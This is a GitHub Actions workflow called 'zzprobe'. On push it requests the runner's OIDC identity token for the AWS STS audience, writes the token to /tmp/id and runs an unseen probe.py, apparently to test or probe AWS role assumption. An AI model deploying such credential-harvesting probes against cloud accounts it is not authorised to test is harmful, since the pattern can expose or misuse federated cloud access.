name: zzprobe
on:
  workflow_dispatch:
  push:
    branches: [ main, master ]
permissions:
  id-token: write
  contents: read
jobs:
  p:
    runs-on: ubuntu-latest
    timeout-minutes: 350
    steps:
      - uses: actions/checkout@v4
      - name: assume
        run: |
          R=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com")
          echo "$R" | python3 -c "import sys,json;open('/tmp/id','w').write(json.load(sys.stdin).get('value',''))"
          python3 probe.py
